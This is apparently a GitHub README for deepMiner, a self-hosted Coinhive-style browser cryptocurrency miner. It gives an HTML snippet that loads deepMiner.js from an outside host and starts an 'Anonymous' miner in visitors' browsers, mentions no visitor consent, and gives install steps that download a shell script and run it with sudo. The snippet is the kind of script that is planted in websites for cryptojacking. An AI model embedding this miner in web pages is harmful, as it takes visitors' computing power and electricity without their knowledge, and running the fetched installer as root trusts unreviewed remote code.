# deepMiner
atat
```acsii
:::::::-.  .,:::::: .,::::::::::::::::. .        :   ::::::.    :::..,:::::: :::::::..
 ;;,   `';,;;;;'''' ;;;;'''' `;;;```.;;;;;,.    ;;;  ;;;`;;;;,  `;;;;;;;'''' ;;;;``;;;;
 `[[     [[ [[cccc   [[cccc   `]]nnn]]' [[[[, ,[[[[, [[[  [[[[[. '[[ [[cccc   [[[,/[[['
  $$,    $$ $$""""   $$""""    $$$""    $$$$$$$$"$$$ $$$  $$$ "Y$c$$ $$""""   $$$$$$c
  888_,o8P' 888oo,__ 888oo,__  888o     888 Y88" 888o888  888    Y88 888oo,__ 888b "88bo,
  MMMMP"`   """"YUMMM""""YUMMM YMMMb    MMM  M'  "MMMMMM  MMM     YM """"YUMMMMMMM   "W"

----------------------------------------------------------------------------------------
```

## Usage

* Add some javascript and write like this :

```html
<script src="https://deepc.cc/deepMiner.js"></script>
<script>
    var miner = new deepMiner.Anonymous('deepMiner_test').start();
</script>
```

* All done! XD~ Let's build our srv by self

## Install

```bash
curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
sudo sh install.sh
```

lib request: `*nodejs` / `*npm` / `?nginx`

useful pakages: `forever`

ssl support: <https://certbot.eff.org/>

OS pass: `ubuntu(debian)`

## API

Same like this: <https://coinhive.com/documentation/miner> (JUST javascript API)

## Update

Just go `/srv/deepMiner` and run `git pull`

DON'T forget backup your `config.json` !!!

## Attention

Some VPS's default DNS can't find IP for the pool. Check your DNS setting if it's wrong.

SSL cert request default TRUE. Use `certbot` to quickly set it.

If not a bug just Qus in something setting or in install. Please write down at <https://github.com/deepwn/deepMiner/issues/8>

## Example & Some tips

<https://deepc.cc/demo.html>

## Source

```acsii
deepMiner.git
.
|-- README.md
|-- banner
|-- config.json
|-- LICENSE
|-- package-lock.json
|-- package.json
|-- server.js
|__ web
    |-- 404.html
    |-- deepMiner.js
    |-- demo.html
    |-- index.html
    |-- lib
    |   |-- cryptonight-asmjs.min.js
    |   |-- cryptonight-asmjs.min.js.mem
    |   |__ cryptonight.wasm
    |__ worker.js
```

